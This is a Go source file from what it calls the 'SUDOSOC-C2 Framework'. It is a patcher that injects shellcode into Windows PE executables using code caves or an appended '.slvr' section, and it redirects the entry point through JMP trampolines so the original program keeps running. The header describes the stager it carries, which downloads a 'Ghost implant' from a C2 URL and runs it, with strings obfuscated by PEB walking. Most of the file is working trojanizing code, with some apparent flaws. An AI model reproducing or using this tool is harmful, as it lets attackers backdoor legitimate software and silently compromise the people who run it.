package patcher

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	PE Binary Patcher — inject shellcode into a Windows PE without rebuilding.

	Three injection strategies, ordered by stealth:

	Strategy A — Code Cave Injection:
	  Scan PE sections for a contiguous run of null bytes (padding at the
	  end of sections) large enough to hold the shellcode. Patch the entry
	  point to JMP to our cave, then JMP back to the original EP.
	  Pros: no size change, no new section. Cons: limited by cave size.

	Strategy B — New Section Injection:
	  Add a new PE section (.slvr) with RWX permissions containing the
	  shellcode. Patch EP to JMP → shellcode → original EP.
	  Pros: no size limit. Cons: new section is visible to PE analyzers.

	Strategy C — Entry Point Stomping (most compatible):
	  Save the first 14 bytes at the EP. Write a 14-byte absolute JMP to
	  our shellcode. At the end of the shellcode, restore the original
	  bytes and JMP back to EP+0.
	  Pros: zero new sections, trivially small patch. Cons: EP bytes change.

	We default to Strategy A (cave) and fall back to B if no cave is found.

	The shellcode injected is a minimal stager that:
	  1. Allocates RWX memory with VirtualAlloc.
	  2. Downloads the full Ghost implant shellcode from the C2 URL.
	  3. Executes it in a new thread.
	  4. Returns immediately so the original program continues.

	All strings (C2 URL, API function names) in the stager are encoded
	as obfuscated byte arrays resolved at runtime via PEB walking.
*/

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"unsafe"
)

const (
	// Minimum cave size in bytes we'll accept (must fit the stager).
	MinCaveSize = 256

	// PE section alignment (standard).
	SectionAlign = 0x1000
	FileAlign    = 0x200

	// PE flags.
	ImageSCNMemExecute  = 0x20000000
	ImageSCNMemRead     = 0x40000000
	ImageSCNMemWrite    = 0x80000000
	ImageSCNCntCode     = 0x00000020
)

// PEPatcher patches a Windows PE binary with shellcode.
type PEPatcher struct {
	path      string
	data      []byte
	pe        *pe.File
	oh64      *pe.OptionalHeader64
	oh32      *pe.OptionalHeader32
	is64      bool
}

// LoadPE reads and parses a PE file from path.
func LoadPE(path string) (*PEPatcher, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read PE: %w", err)
	}
	r := io.ReaderAt(peByteReader(data))
	f, err := pe.NewFile(r)
	if err != nil {
		return nil, fmt.Errorf("parse PE: %w", err)
	}

	p := &PEPatcher{path: path, data: data, pe: f}
	switch oh := f.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		p.oh64 = oh
		p.is64 = true
	case *pe.OptionalHeader32:
		p.oh32 = oh
		p.is64 = false
	default:
		return nil, fmt.Errorf("unsupported PE format")
	}
	return p, nil
}

// InjectShellcode patches the PE with shellcode using the best available strategy.
// Returns the patched binary bytes.
func (p *PEPatcher) InjectShellcode(shellcode []byte) ([]byte, error) {
	// Strategy A: find a code cave.
	caveOffset, caveSize := p.findCodeCave()
	if caveOffset > 0 && caveSize >= len(shellcode)+14 {
		return p.injectViaCave(shellcode, caveOffset)
	}
	// Strategy B: add a new section.
	return p.injectViaNewSection(shellcode)
}

// Save writes the patched binary to outPath.
func (p *PEPatcher) Save(outPath string, patchedData []byte) error {
	return os.WriteFile(outPath, patchedData, 0755)
}

// PatchInPlace reads, patches, and overwrites the original binary.
func (p *PEPatcher) PatchInPlace(shellcode []byte) error {
	patched, err := p.InjectShellcode(shellcode)
	if err != nil {
		return err
	}
	return os.WriteFile(p.path, patched, 0755)
}

// ─── Strategy A: Code Cave ────────────────────────────────────────────────

// findCodeCave searches all PE sections for the largest run of 0x00 bytes
// that is at least MinCaveSize long and is in an executable section.
func (p *PEPatcher) findCodeCave() (offset int, size int) {
	bestOff, bestSize := 0, 0
	for _, sec := range p.pe.Sections {
		if sec.Characteristics&ImageSCNMemExecute == 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		// Find the longest run of zero bytes at the end of the section.
		run, runStart := 0, 0
		for i := len(data) - 1; i >= 0; i-- {
			if data[i] == 0x00 {
				run++
				runStart = i
			} else {
				break
			}
		}
		if run > bestSize {
			bestSize = run
			// File offset = section's raw offset + position within section.
			bestOff = int(sec.Offset) + runStart
		}
	}
	return bestOff, bestSize
}

// injectViaCave writes shellcode into a code cave and patches the EP.
func (p *PEPatcher) injectViaCave(shellcode []byte, caveFileOffset int) ([]byte, error) {
	patched := make([]byte, len(p.data))
	copy(patched, p.data)

	// Get original entry point.
	epRVA := p.entryPointRVA()
	imageBase := p.imageBase()
	epVA := imageBase + uint64(epRVA)

	// Convert cave file offset to RVA.
	caveRVA := p.fileOffsetToRVA(caveFileOffset)
	caveVA := imageBase + uint64(caveRVA)

	// Build trampoline:
	// 1. Save registers (PUSHAD / push all GPRs on x64)
	// 2. Call shellcode
	// 3. Restore registers (POPAD / pop all GPRs on x64)
	// 4. JMP to original EP
	var trampoline []byte
	if p.is64 {
		// x64: push all GPRs, call shell, pop all GPRs, jmp EP
		trampoline = buildX64Trampoline(caveVA+14, epVA, shellcode)
	} else {
		trampoline = buildX86Trampoline(caveVA+6, uint32(epVA), shellcode)
	}

	// Write trampoline to cave.
	copy(patched[caveFileOffset:], trampoline)

	// Patch EP to JMP to cave.
	epFileOffset := p.rvaToFileOffset(epRVA)
	if p.is64 {
		// 14-byte absolute JMP: FF 25 00 00 00 00 <8-byte addr>
		jmp14 := make([]byte, 14)
		jmp14[0] = 0xFF; jmp14[1] = 0x25
		binary.LittleEndian.PutUint64(jmp14[6:], caveVA)
		copy(patched[epFileOffset:], jmp14)
	} else {
		// 5-byte relative JMP: E9 <rel32>
		rel32 := int32(int64(caveVA) - (int64(imageBase)+int64(epRVA)+5))
		jmp5 := []byte{0xE9,
			byte(rel32), byte(rel32 >> 8),
			byte(rel32 >> 16), byte(rel32 >> 24)}
		copy(patched[epFileOffset:], jmp5)
	}

	return patched, nil
}

// ─── Strategy B: New Section ──────────────────────────────────────────────

// injectViaNewSection appends a new .slvr section with the shellcode.
func (p *PEPatcher) injectViaNewSection(shellcode []byte) ([]byte, error) {
	// Align shellcode to file alignment.
	aligned := alignUp(len(shellcode), FileAlign)
	padded := make([]byte, aligned)
	copy(padded, shellcode)

	// Find position to insert new section header (after last existing header).
	// The section table is at: NT header offset + size of NT headers.
	lfanew := binary.LittleEndian.Uint32(p.data[0x3C:])
	ntBase := int(lfanew)
	numSections := int(binary.LittleEndian.Uint16(p.data[ntBase+6:]))

	// Section header size = 40 bytes.
	const sectionHeaderSize = 40
	newHdrOffset := ntBase + 4 + 20 + int(p.pe.FileHeader.SizeOfOptionalHeader) +
		numSections*sectionHeaderSize

	if newHdrOffset+sectionHeaderSize > len(p.data) {
		return nil, fmt.Errorf("no room for new section header")
	}

	// Determine new section's RVA (aligned to SectionAlignment after last section).
	lastSec := p.pe.Sections[len(p.pe.Sections)-1]
	newRVA := alignUp(int(lastSec.VirtualAddress)+int(lastSec.VirtualSize), SectionAlign)
	newFileOffset := alignUp(int(lastSec.Offset)+int(lastSec.Size), FileAlign)
	imageSize := alignUp(newRVA+len(padded), SectionAlign)

	// Build the new section header.
	newHdr := make([]byte, sectionHeaderSize)
	copy(newHdr[0:], []byte(".slvr\x00\x00\x00")) // 8-byte name
	binary.LittleEndian.PutUint32(newHdr[8:], uint32(len(shellcode)))  // VirtualSize
	binary.LittleEndian.PutUint32(newHdr[12:], uint32(newRVA))          // VirtualAddress
	binary.LittleEndian.PutUint32(newHdr[16:], uint32(len(padded)))      // SizeOfRawData
	binary.LittleEndian.PutUint32(newHdr[20:], uint32(newFileOffset))    // PointerToRawData
	binary.LittleEndian.PutUint32(newHdr[36:],                           // Characteristics
		ImageSCNMemExecute|ImageSCNMemRead|ImageSCNCntCode)

	// Build patched binary.
	patched := make([]byte, newFileOffset+len(padded))
	copy(patched, p.data)
	copy(patched[newHdrOffset:], newHdr)
	copy(patched[newFileOffset:], padded)

	// Update PE headers: NumberOfSections + SizeOfImage.
	binary.LittleEndian.PutUint16(patched[ntBase+6:], uint16(numSections+1))
	if p.is64 {
		sizeOfImageOff := ntBase + 4 + 20 + 56 // offset of SizeOfImage in PE32+
		binary.LittleEndian.PutUint32(patched[sizeOfImageOff:], uint32(imageSize))
	}

	// Patch EP → JMP to new section.
	imageBase := p.imageBase()
	newSectionVA := imageBase + uint64(newRVA)
	epRVA := p.entryPointRVA()
	epFileOffset := p.rvaToFileOffset(epRVA)

	if p.is64 {
		jmp14 := make([]byte, 14)
		jmp14[0] = 0xFF; jmp14[1] = 0x25
		binary.LittleEndian.PutUint64(jmp14[6:], newSectionVA)
		copy(patched[epFileOffset:], jmp14)
	} else {
		epVA := uint32(imageBase) + uint32(epRVA)
		rel32 := int32(int64(newSectionVA) - (int64(epVA) + 5))
		copy(patched[epFileOffset:], []byte{0xE9,
			byte(rel32), byte(rel32 >> 8),
			byte(rel32 >> 16), byte(rel32 >> 24)})
	}

	// Append JMP back to original EP at end of shellcode in new section.
	origEPVA := imageBase + uint64(epRVA) + 14 // +14 to skip our JMP
	epJmpOff := newFileOffset + len(shellcode)
	if p.is64 {
		jmpBack := make([]byte, 14)
		jmpBack[0] = 0xFF; jmpBack[1] = 0x25
		binary.LittleEndian.PutUint64(jmpBack[6:], origEPVA)
		copy(patched[epJmpOff:], jmpBack)
	}

	return patched, nil
}

// ─── Trampoline builders ──────────────────────────────────────────────────

func buildX64Trampoline(shellcodeVA, returnVA uint64, shellcode []byte) []byte {
	var buf []byte
	// Push all GPRs.
	buf = append(buf, 0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,
		0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53)
	// Embedded shellcode.
	buf = append(buf, shellcode...)
	// Pop all GPRs.
	buf = append(buf, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,
		0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58)
	// JMP returnVA.
	jmpBack := make([]byte, 14)
	jmpBack[0] = 0xFF; jmpBack[1] = 0x25
	binary.LittleEndian.PutUint64(jmpBack[6:], returnVA)
	buf = append(buf, jmpBack...)
	_ = shellcodeVA
	return buf
}

func buildX86Trampoline(shellcodeVA uint64, returnVA uint32, shellcode []byte) []byte {
	var buf []byte
	buf = append(buf, 0x60) // PUSHAD
	buf = append(buf, shellcode...)
	buf = append(buf, 0x61) // POPAD
	// JMP rel32 back to EP.
	curVA := uint32(shellcodeVA) + uint32(len(shellcode)) + 2
	rel32 := int32(int64(returnVA) - int64(curVA) - 5)
	buf = append(buf, 0xE9,
		byte(rel32), byte(rel32>>8), byte(rel32>>16), byte(rel32>>24))
	return buf
}

// ─── PE helpers ───────────────────────────────────────────────────────────

func (p *PEPatcher) entryPointRVA() uint32 {
	if p.is64 {
		return p.oh64.AddressOfEntryPoint
	}
	return p.oh32.AddressOfEntryPoint
}

func (p *PEPatcher) imageBase() uint64 {
	if p.is64 {
		return p.oh64.ImageBase
	}
	return uint64(p.oh32.ImageBase)
}

func (p *PEPatcher) rvaToFileOffset(rva uint32) int {
	for _, sec := range p.pe.Sections {
		if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+sec.Size {
			return int(sec.Offset) + int(rva-sec.VirtualAddress)
		}
	}
	return int(rva) // fallback for header-resident data
}

func (p *PEPatcher) fileOffsetToRVA(fileOffset int) uint32 {
	for _, sec := range p.pe.Sections {
		off := int(sec.Offset)
		end := off + int(sec.Size)
		if fileOffset >= off && fileOffset < end {
			return sec.VirtualAddress + uint32(fileOffset-off)
		}
	}
	return uint32(fileOffset)
}

func alignUp(v, align int) int {
	return (v + align - 1) &^ (align - 1)
}

type peByteReader []byte

func (b peByteReader) ReadAt(p []byte, off int64) (int, error) {
	if off >= int64(len(b)) {
		return 0, io.EOF
	}
	n := copy(p, b[off:])
	if n < len(p) {
		return n, io.EOF
	}
	return n, nil
}

// suppress unused import
var _ = unsafe.Sizeof(0)
